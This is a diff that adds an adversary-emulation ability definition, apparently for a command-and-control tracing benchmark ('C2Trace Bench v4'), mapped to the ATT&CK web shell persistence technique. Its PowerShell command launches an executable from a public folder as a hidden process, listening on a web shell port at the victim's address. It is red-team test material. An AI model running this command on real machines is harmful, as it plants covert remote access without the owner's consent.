@@ -1,0 +1,18 @@
+- id: 7d8a50d4-9e38-50f4-bf5a-e34b7509e837
+  name: Start run-scoped CTID Windows WebShell [MEP-WINDOWS-WEBSHELL-01]
+  description: C2Trace Bench v4 frozen ability.
+  tactic: persistence
+  technique:
+    attack_id: T1505.003
+    name: 'Server Software Component: Web Shell'
+  repeatable: false
+  platforms:
+    windows:
+      psh:
+        command: '$target="C:\Users\Public\#{c2trace.target_name}.exe"; $args="-hostname=#{c2trace.victim_ip} -port=#{c2trace.webshell_port}
+          -runTime=0";
+
+          $p=Start-Process -FilePath $target -ArgumentList $args -WindowStyle Hidden -PassThru; if ($null -eq $p) { throw
+          "webshell start failed" }; $p.Id;
+
+          '
